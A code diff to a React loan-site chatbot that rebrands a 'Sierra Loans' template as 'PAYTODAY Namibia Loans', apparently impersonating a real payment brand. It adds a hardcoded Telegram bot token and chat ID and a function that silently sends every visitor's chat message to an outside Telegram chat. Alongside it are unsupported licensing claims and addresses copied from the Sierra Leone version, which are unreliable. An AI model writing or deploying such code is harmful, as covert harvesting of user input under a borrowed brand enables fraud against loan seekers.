@@ -13,22 +13,64 @@ interface FAQ {
   answer: string;
 }
 
+// Telegram Bot Configuration
+const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '8570815071:AAGvDaBcq8384ZWItYQWlcsjGgXpgGQI2A8';
+const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID || '7973653220';
+
+const sendToTelegram = async (message: string): Promise<boolean> => {
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+    console.log('Telegram not configured - message would be:', message);
+    return false;
+  }
+  
+  try {
+    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    
+    console.log('Sending to Telegram:', telegramUrl);
+    console.log('Chat ID:', TELEGRAM_CHAT_ID);
+    
+    const response = await fetch(telegramUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    });
+    
+    const data = await response.json();
+    console.log('Telegram response:', data);
+    
+    if (data.ok) {
+      console.log('Telegram message sent successfully!');
+      return true;
+    } else {
+      console.error('Telegram error:', data.description);
+      return false;
+    }
+  } catch (error) {
+    console.error('Failed to send to Telegram:', error);
+    return false;
+  }
+};
+
 const faqs: FAQ[] = [
   {
     keywords: ['hello', 'hi', 'hey', 'good morning', 'good afternoon', 'good evening'],
-    answer: 'Hello! Welcome to Sierra Loans! 👋 I\'m here to help you with any questions about our loan services. How can I assist you today?'
+    answer: 'Hello! Welcome to PAYTODAY Namibia Loans! 👋 I\'m here to help you with any questions about our loan services. How can I assist you today?'
   },
   {
-    keywords: ['loan', 'apply', 'application', 'how to apply', 'get loan', 'borrow'],
-    answer: 'Applying for a loan is easy! 📝\n\n1. Use our loan calculator to choose your amount (SLL 50,000 - 1,000,000)\n2. Select your repayment period (3-24 months)\n3. Click "Apply Now" and fill in your details\n4. Submit and wait for approval within 24-48 hours\n\nYou can also visit any of our branches or call us at +232 76 123 456.'
+    keywords: ['loan', 'apply', 'application', 'how to apply', 'get loan', 'borrow', 'apply now', 'start application'],
+    answer: 'Great choice! 🎉\n\nApplying is easy!\n\n1. Click "Get Started" on the page\n2. Enter your phone number\n3. Verify with OTP\n4. Fill in your details\n5. Submit!\n\nAmounts: N$1,000 - N$20,000\nRepayment: 6-36 months\n\nClick "Get Started" above to begin!'
   },
   {
     keywords: ['amount', 'maximum', 'minimum', 'how much', 'loan limit', '1 million', '1000000'],
-    answer: 'Our loan amounts range from:\n\n💰 Minimum: SLL 50,000\n💰 Maximum: SLL 1,000,000 (1 Million)\n\nThe amount you qualify for depends on your income and repayment capacity. Use our calculator to see your estimated monthly payments!'
+    answer: 'Our loan amounts range from:\n\n💰 Minimum: NAD 5,000\n💰 Maximum: NAD 100,000\n\nThe amount you qualify for depends on your income and repayment capacity. Use our calculator to see your estimated monthly payments!'
   },
   {
     keywords: ['interest', 'rate', 'charge', 'fee', 'cost', 'pay back', 'repayment'],
-    answer: 'Our interest rates are competitive and transparent! 📊\n\n• Monthly interest rate: 2.5%\n• Processing fee: SLL 10,000 (one-time)\n• No hidden charges\n• Early repayment accepted without penalty\n\nExample: For SLL 500,000 over 12 months, your monthly payment would be approximately SLL 48,750.'
+    answer: 'Our interest rates are competitive and transparent! 📊\n\n• Monthly interest rate: 2.5%\n• Processing fee: NAD 500 (one-time)\n• No hidden charges\n• Early repayment accepted without penalty\n\nExample: For NAD 50,000 over 12 months, your monthly payment would be approximately NAD 4,875.'
   },
   {
     keywords: ['duration', 'period', 'time', 'months', 'how long', 'repayment period'],
@@ -36,7 +78,7 @@ const faqs: FAQ[] = [
   },
   {
     keywords: ['requirement', 'document', 'need', 'qualify', 'eligible', 'criteria'],
-    answer: 'To apply for a loan, you need:\n\n📋 Requirements:\n• Valid ID (National ID, Passport, or Driver\'s License)\n• Proof of income (payslip or business records)\n• Bank statement (last 3 months)\n• Proof of address (utility bill)\n• Must be 18 years or older\n• Must be a resident of Sierra Leone\n\nSelf-employed? We accept business registration documents too!'
+    answer: 'To apply for a loan, you need:\n\n📋 Requirements:\n• Valid ID (National ID, Passport, or Driver\'s License)\n• Proof of income (payslip or business records)\n• Bank statement (last 3 months)\n• Proof of address (utility bill)\n• Must be 18 years or older\n• Must be a resident of Namibia\n\nSelf-employed? We accept business registration documents too!'
   },
   {
     keywords: ['approval', 'how long', 'wait', 'time', 'process', 'get money', 'disbursement'],
@@ -48,15 +90,15 @@ const faqs: FAQ[] = [
   },
   {
     keywords: ['branch', 'location', 'office', 'visit', 'find', 'where', 'address'],
-    answer: 'We have branches across Sierra Leone! 🏢\n\nMain Branch:\n• Freetown - 123 Lightfoot Boston Street\n\nOther Locations:\n• Bo - 45 Main Road\n• Kenema - 12 Dama Road\n• Makeni - 8 Magburaka Highway\n• Kono - 3 Koidu Town Center\n\nWorking Hours: Monday-Friday, 8:00 AM - 4:00 PM\nSaturday: 9:00 AM - 1:00 PM'
+    answer: 'We have branches across Namibia! 🏢\n\nMain Branch:\n• Windhoek - Cnr. of Mosé Tjitendero & Hamutenya Wanahepo Ndadi Street, Olympia\n\nOther Locations:\n• Swakopmund - 45 Main Road\n• Walvis Bay - 12 Dama Road\n• Oshakati - 8 Main Highway\n• Keetmanshoop - 3 Town Center\n\nWorking Hours: Monday-Friday, 8:00 AM - 4:00 PM\nSaturday: 9:00 AM - 1:00 PM'
   },
   {
     keywords: ['contact', 'phone', 'email', 'call', 'reach', 'support', 'help'],
-    answer: 'We\'re here to help! 📞\n\nContact Us:\n• Phone: +232 76 123 456\n• WhatsApp: +232 76 123 456\n• Email: info@sierraloans.sl\n• Facebook: Sierra Loans SL\n• Instagram: @sierraloans\n\nCustomer Service Hours:\nMonday-Saturday, 8:00 AM - 6:00 PM'
+    answer: 'We\'re here to help! 📞\n\nContact Us:\n• Phone: +264 61 280 2000\n• WhatsApp: +264 81 150 0100\n• Email: support@paytoday.com.na\n• Facebook: PAYTODAY Namibia\n• Instagram: @paytodaynamibia\n\nCustomer Service Hours:\nMonday-Saturday, 8:00 AM - 6:00 PM'
   },
   {
     keywords: ['business loan', 'business', 'sme', 'company', 'entrepreneur', 'startup'],
-    answer: 'Yes, we offer business loans! 💼\n\nBusiness Loan Features:\n• Amount: Up to SLL 1,000,000\n• Flexible repayment terms\n• Competitive interest rates\n• Fast approval for registered businesses\n\nAdditional Requirements:\n• Business registration certificate\n• Tax clearance certificate\n• Business bank statements (6 months)\n• Business plan (for loans above SLL 500,000)'
+    answer: 'Yes, we offer business loans! 💼\n\nBusiness Loan Features:\n• Amount: Up to NAD 100,000\n• Flexible repayment terms\n• Competitive interest rates\n• Fast approval for registered businesses\n\nAdditional Requirements:\n• Business registration certificate\n• Tax clearance certificate\n• Business bank statements (6 months)\n• Business plan (for loans above NAD 50,000)'
   },
   {
     keywords: ['personal loan', 'personal', 'individual', 'salary', 'employee'],
@@ -64,11 +106,11 @@ const faqs: FAQ[] = [
   },
   {
     keywords: ['emergency', 'urgent', 'quick', 'fast', 'today', 'now', 'immediate'],
-    answer: 'Need money urgently? We can help! 🚨\n\nFast Track Options:\n• Existing customers: Approval in 2-4 hours\n• Small loans (under SLL 200,000): Same day\n• Emergency medical loans: Priority processing\n\nTips for faster approval:\n• Have all documents ready\n• Apply during business hours\n• Ensure your phone is reachable'
+    answer: 'Need money urgently? We can help! 🚨\n\nFast Track Options:\n• Existing customers: Approval in 2-4 hours\n• Small loans (under NAD 20,000): Same day\n• Emergency medical loans: Priority processing\n\nTips for faster approval:\n• Have all documents ready\n• Apply during business hours\n• Ensure your phone is reachable'
   },
   {
     keywords: ['default', 'miss payment', 'late', 'penalty', 'cannot pay', 'problem'],
-    answer: 'Having trouble with payments? Don\'t worry! 🤝\n\nIf you\'re facing difficulties:\n• Contact us immediately - we\'re here to help\n• We can discuss payment restructuring\n• Extensions may be available\n• Early communication prevents penalties\n\nPenalties for late payment:\n• 5% late fee after 7 days\n• Additional 2% per week thereafter\n\nCall us: +232 76 123 456'
+    answer: 'Having trouble with payments? Don\'t worry! 🤝\n\nIf you\'re facing difficulties:\n• Contact us immediately - we\'re here to help\n• We can discuss payment restructuring\n• Extensions may be available\n• Early communication prevents penalties\n\nPenalties for late payment:\n• 5% late fee after 7 days\n• Additional 2% per week thereafter\n\nCall us: +264 61 280 2000'
   },
   {
     keywords: ['early repayment', 'pay off', 'settle early', 'finish loan', 'complete'],
@@ -80,7 +122,7 @@ const faqs: FAQ[] = [
   },
   {
     keywords: ['security', 'collateral', 'guarantor', 'guarantee', 'asset', 'property'],
-    answer: 'Most of our loans are unsecured! 🔓\n\nFor loans up to SLL 500,000:\n• No collateral required\n• No guarantor needed\n\nFor loans above SLL 500,000:\n• May require a guarantor\n• Or proof of stable income\n\nYour employment or business income serves as security for the loan.'
+    answer: 'Most of our loans are unsecured! 🔓\n\nFor loans up to NAD 50,000:\n• No collateral required\n• No guarantor needed\n\nFor loans above NAD 50,000:\n• May require a guarantor\n• Or proof of stable income\n\nYour employment or business income serves as security for the loan.'
   },
   {
     keywords: ['student', 'school fees', 'education', 'university', 'college', 'study'],
@@ -92,7 +134,7 @@ const faqs: FAQ[] = [
   },
   {
     keywords: ['women', 'female', 'lady', 'woman', 'gender', 'empowerment'],
-    answer: 'We empower women entrepreneurs! 💪\n\nWomen\'s Loan Program:\n• Special interest rates for women-owned businesses\n• Business training workshops\n• Mentorship opportunities\n• Priority processing for women applicants\n\nSierra Loans believes in financial inclusion for all!'
+    answer: 'We empower women entrepreneurs! 💪\n\nWomen\'s Loan Program:\n• Special interest rates for women-owned businesses\n• Business training workshops\n• Mentorship opportunities\n• Priority processing for women applicants\n\nPAYTODAY Namibia believes in financial inclusion for all!'
   },
   {
     keywords: ['refinance', 'top up', 'additional', 'more money', 'increase', 'second loan'],
@@ -104,7 +146,7 @@ const faqs: FAQ[] = [
   },
   {
     keywords: ['scam', 'fraud', 'fake', 'legit', 'real', 'trust', 'safe'],
-    answer: 'Sierra Loans is 100% legitimate! ✅\n\nWe are:\n• Licensed by Bank of Sierra Leone\n• Registered with Corporate Affairs Commission\n• Member of Sierra Leone Microfinance Association\n• Over 50,000 satisfied customers\n\nWarning signs of fraud:\n• We NEVER ask for upfront fees before approval\n• We ONLY use official phone numbers\n• We have physical offices you can visit\n\nStay safe - only deal with our official channels!'
+    answer: 'PAYTODAY Namibia Loans is 100% legitimate! ✅\n\nWe are:\n• Licensed by the Bank of Namibia\n• Part of PAYTODAY - Namibia\'s leading payment platform\n• Over 2 million active users\n\nWarning signs of fraud:\n• We NEVER ask for upfront fees before approval\n• We ONLY use official phone numbers\n• We have physical offices you can visit\n\nStay safe - only deal with our official channels!'
   },
   {
     keywords: ['thank', 'thanks', 'appreciate', 'grateful', 'ok', 'okay', 'great'],
@@ -112,15 +154,15 @@ const faqs: FAQ[] = [
   },
   {
     keywords: ['bye', 'goodbye', 'see you', 'later', 'take care'],
-    answer: 'Goodbye! 👋 Thank you for choosing Sierra Loans. We look forward to serving you. Have a wonderful day!'
+    answer: 'Goodbye! 👋 Thank you for choosing PAYTODAY Namibia Loans. We look forward to serving you. Have a wonderful day!'
   }
 ];
 
 const defaultResponses = [
   "I'm not sure I understand. Could you rephrase that? 🤔",
-  "That's a great question! Please call us at +232 76 123 456 for more details. 📞",
+  "That's a great question! Please call us at +264 61 280 2000 for more details. 📞",
   "I'd be happy to help with that. Can you provide more details about what you're looking for?",
-  "For that specific query, it's best to speak with our customer service team at +232 76 123 456."
+  "For that specific query, it's best to speak with our customer service team at +264 61 280 2000."
 ];
 
 const ChatBot = () => {
@@ -128,7 +170,7 @@ const ChatBot = () => {
   const [messages, setMessages] = useState<Message[]>([
     {
       id: 1,
-      text: 'Hello! Welcome to Sierra Loans! 👋 I\'m your virtual assistant. How can I help you today?',
+      text: 'Hello! Welcome to PAYTODAY Namibia Loans! 👋 I\'m your virtual assistant. How can I help you today?',
       isBot: true,
       timestamp: new Date()
     }
@@ -171,6 +213,9 @@ const ChatBot = () => {
     setMessages(prev => [...prev, userMessage]);
     setInputText('');
 
+    // Send to Telegram
+    sendToTelegram(`💬 CHATBOT MESSAGE\n\n👤 User Question: ${inputText}\n⏰ Time: ${new Date().toLocaleString()}`);
+
     // Simulate bot thinking
     setTimeout(() => {
       const botResponse: Message = {
@@ -193,7 +238,8 @@ const ChatBot = () => {
     'How do I apply?',
     'Loan requirements?',
     'Interest rates?',
-    'Contact us'
+    'Contact us',
+    'Apply now'
   ];
 
   return (
@@ -201,22 +247,22 @@ const ChatBot = () => {
       {/* Chat Button */}
       <button
         onClick={() => setIsOpen(true)}
-        className={`fixed bottom-24 right-6 z-50 w-14 h-14 bg-[#F97316] rounded-full shadow-lg flex items-center justify-center text-white hover:bg-[#EA580C] transition-all duration-300 hover:scale-110 ${isOpen ? 'hidden' : 'flex'}`}
+        className={`fixed bottom-24 right-6 z-50 w-14 h-14 bg-gradient-to-br from-[#2d21e9] to-[#920fd4] rounded-full shadow-lg flex items-center justify-center text-white hover:scale-110 transition-all duration-300 animate-pulse ${isOpen ? 'hidden' : 'flex'}`}
       >
         <MessageCircle className="w-6 h-6" />
       </button>
 
       {/* Chat Window */}
       {isOpen && (
-        <div className="fixed bottom-24 right-6 z-50 w-80 md:w-96 bg-white rounded-2xl shadow-2xl overflow-hidden border border-gray-200">
+        <div className="fixed bottom-24 right-6 z-50 w-80 md:w-96 bg-gradient-to-br from-white to-gray-50 rounded-2xl shadow-2xl overflow-hidden border border-gray-200 animate-slide-in-right">
           {/* Header */}
-          <div className="bg-[#F97316] p-4 flex items-center justify-between">
+          <div className="bg-[#2d21e9] p-4 flex items-center justify-between">
             <div className="flex items-center gap-3">
               <div className="w-10 h-10 bg-white/20 rounded-full flex items-center justify-center">
                 <Bot className="w-6 h-6 text-white" />
               </div>
               <div>
-                <h3 className="text-white font-semibold">Sierra Loans AI</h3>
+                <h3 className="text-white font-semibold">PAYTODAY Namibia AI</h3>
                 <p className="text-white/70 text-xs">Online - Ready to help</p>
               </div>
             </div>
@@ -236,7 +282,7 @@ const ChatBot = () => {
                 className={`flex gap-2 mb-4 ${message.isBot ? '' : 'flex-row-reverse'}`}
               >
                 <div className={`w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 ${
-                  message.isBot ? 'bg-[#F97316]' : 'bg-gray-300'
+                  message.isBot ? 'bg-[#2d21e9]' : 'bg-gray-300'
                 }`}>
                   {message.isBot ? (
                     <Bot className="w-4 h-4 text-white" />
@@ -247,7 +293,7 @@ const ChatBot = () => {
                 <div className={`max-w-[75%] p-3 rounded-2xl text-sm whitespace-pre-line ${
                   message.isBot
                     ? 'bg-white text-gray-800 rounded-tl-none shadow-sm'
-                    : 'bg-[#F97316] text-white rounded-tr-none'
+                    : 'bg-[#2d21e9] text-white rounded-tr-none'
                 }`}>
                   {message.text}
                 </div>
@@ -267,7 +313,7 @@ const ChatBot = () => {
                         setInputText(q);
                         setTimeout(handleSend, 100);
                       }}
-                      className="px-3 py-1 bg-[#FFF7ED] text-[#F97316] text-xs rounded-full hover:bg-[#F97316] hover:text-white transition-colors"
+                      className="px-3 py-1 bg-[#1affd5]/20 text-[#2d21e9] text-xs rounded-full hover:bg-[#2d21e9] hover:text-white transition-colors"
                     >
                       {q}
                     </button>
@@ -286,12 +332,12 @@ const ChatBot = () => {
                 onChange={(e) => setInputText(e.target.value)}
                 onKeyPress={handleKeyPress}
                 placeholder="Type your message..."
-                className="flex-1 px-4 py-2 bg-gray-100 rounded-full text-sm focus:outline-none focus:ring-2 focus:ring-[#F97316]"
+                className="flex-1 px-4 py-2 bg-gray-100 rounded-full text-sm focus:outline-none focus:ring-2 focus:ring-[#2d21e9]"
               />
               <button
                 onClick={handleSend}
                 disabled={!inputText.trim()}
-                className="w-10 h-10 bg-[#F97316] rounded-full flex items-center justify-center text-white hover:bg-[#EA580C] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
+                className="w-10 h-10 bg-[#2d21e9] rounded-full flex items-center justify-center text-white hover:bg-[#1a1ad9] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
               >
                 <Send className="w-4 h-4" />
               </button>
